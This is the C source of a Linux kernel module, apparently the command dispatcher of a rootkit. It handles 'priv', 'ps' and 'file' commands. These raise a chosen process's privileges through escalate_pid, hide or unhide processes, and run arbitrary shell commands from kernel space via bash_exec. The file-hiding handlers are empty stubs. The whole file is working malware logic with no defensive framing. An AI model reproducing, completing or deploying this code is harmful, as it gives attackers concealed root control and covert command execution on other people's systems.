#include <linux/slab.h>

#include "log.h"
#include "commands.h"
#include "privilege_escalation.h"
#include "hide_proc.h"
#include "userland_exec.h"

int commands_priv_handler(int argc, char **argv);
int commands_proc_handler(int argc, char **argv);
int commands_file_handler(int argc, char **argv);

int commands_dispatch(int argc, char **argv)
{
	ketopt_t o = KETOPT_INIT_ZERO;

	char *cmd = NULL;
	int c;
	int ret = 0;

	while ((c = ketopt(&o, argc, argv, 0, "", 0)) >= 0) {
		/* read until first command */
	}

	if (o.ind == argc) {
		IMLOG_WARNING("Missing command\n");
		return -EINVAL;
	}

	cmd = argv[o.ind];

	if (strncmp("priv", cmd, 4) == 0) {
		commands_priv_handler(argc, argv);
	} else if (strncmp("ps", cmd, 2) == 0) {
		commands_proc_handler(argc, argv);
	} else if (strncmp("file", cmd, 4) == 0) {
		commands_file_handler(argc, argv);
	} else {
		IMLOG_WARNING("Unknown command: %s\n", cmd);
		return -EINVAL;
	}

	return ret;
}

int commands_priv_handler(int argc, char **argv)
{
	int err = 0;
	int c;
	ketopt_t o = KETOPT_INIT;

	int pid = INVALID_PID;
	int perm = DEFAULT_CRED;

	while ((c = ketopt(&o, argc, argv, 1, "", priv_longopts)) >= 0) {
		switch (c) {
		case OPT_PRIV_PID:
			if (o.arg) {
				if (kstrtol(o.arg, 10, (long *)&pid)) {
					err++;
					break;
				}
			} else {
				err++;
			}
			break;
		case OPT_PRIV_PERM:
			if (o.arg) {
				if (kstrtol(o.arg, 10, (long *)&perm)) {
					err++;
					break;
				}
			} else {
				err++;
			}
			break;
		}
	}

	if (pid == INVALID_PID) {
		err++;
	}

	if (!err) {
		escalate_pid(pid, perm);
	}

	return err ? -EINVAL : 0;
}

char *gather_exec_args(int argc, char **argv, ketopt_t o)
{
	int str_len, arr_ind;
	char *exec_arg = kmalloc(EXEC_CMD_MAX_LEN * sizeof(char), GFP_KERNEL);

	str_len = 0;
	exec_arg[0] = '\0';

	for (arr_ind = o.ind - 1; arr_ind < argc; arr_ind++) {
		if (str_len + 1 + strlen(argv[arr_ind]) <= EXEC_CMD_MAX_LEN) {
			if (str_len != 0) {
				strcat(exec_arg, " ");
			}
			strcat(exec_arg, argv[arr_ind]);
			str_len += 1 + strlen(argv[arr_ind]);
		} else {
			return NULL;
		}
	}

	return exec_arg;
}

int commands_proc_handler(int argc, char **argv)
{
	int err = 0;
	int c;

	int pid_return;
	char *exec_arg;
	ketopt_t o = KETOPT_INIT;

	while ((c = ketopt(&o, argc, argv, 1, "", proc_longopts)) >= 0) {
		switch (c) {
		case OPT_PROC_SHOW:
			if (o.arg) {
				err += unhide_proc(o.arg);
			} else {
				err++;
			}
			break;
		case OPT_PROC_HIDE:
			if (o.arg) {
				err += hide_proc(o.arg);
			} else {
				err++;
			}
			break;
		case OPT_PROC_KILL:
			break;
		case OPT_PROC_EXEC:
			if (o.arg) {
				exec_arg = gather_exec_args(argc, argv, o);

				if (exec_arg == NULL) {
					err++;
					break;
				}

				IMLOG_INFO("Calling bash_exec with |%s|\n",
					   exec_arg);

				pid_return = bash_exec(exec_arg);

				if (pid_return < 0) {
					err++;
				} else {
					IMLOG_INFO(
						"Process successfully executed, pid %d\n",
						pid_return);
				}
				break;
			}
		}
	}

	return err ? -EINVAL : 0;
}

int commands_file_handler(int argc, char **argv)
{
	int err = 0;
	int c;
	ketopt_t o = KETOPT_INIT;

	while ((c = ketopt(&o, argc, argv, 1, "", file_longopts)) >= 0) {
		switch (c) {
		case OPT_FILE_SHOW:
			break;
		case OPT_FILE_HIDE:
			break;
		}
	}

	return err ? -EINVAL : 0;
}
